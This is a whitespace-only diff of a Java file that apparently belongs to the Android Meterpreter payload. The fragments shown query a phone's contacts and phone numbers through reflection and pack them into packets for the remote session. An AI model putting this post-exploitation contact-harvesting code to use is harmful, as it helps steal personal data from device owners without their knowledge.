@@ -30,7 +30,7 @@ public class dump_contacts_android implements Command {
 	private static final String displayName = "display_name";
 	private static final String contactId = "contact_id";
 	private static final String data1 = "data1";
-	
+
 	@Override
 	public int execute(Meterpreter meterpreter, TLVPacket request,
 			TLVPacket response) throws Exception {
@@ -42,7 +42,7 @@ public class dump_contacts_android implements Command {
 
 			Uri ContactUri = null, PhoneUri = null, EmailUri = null;
 			Class<?> c = Class.forName(classNameContacts);
-			ContactUri = (Uri) c.getField(contentUri).get(ContactUri);			
+			ContactUri = (Uri) c.getField(contentUri).get(ContactUri);
 			Cursor cur = cr.query(ContactUri, null, null, null, null);
 
 			if (cur.getCount() > 0) {
@@ -58,8 +58,8 @@ public class dump_contacts_android implements Command {
 
 					c = Class.forName(classNameData);
 					PhoneUri = (Uri) c.getField(contentUri).get(PhoneUri);
-					Cursor pCur = cr.query(PhoneUri, null, contactId
-							+ " = ?", new String[] { id }, null);
+					Cursor pCur = cr.query(PhoneUri, null, contactId + " = ?",
+							new String[] { id }, null);
 
 					while (pCur.moveToNext()) {
 						pckt.addOverflow(TLV_TYPE_CONTACT_NUMBER,
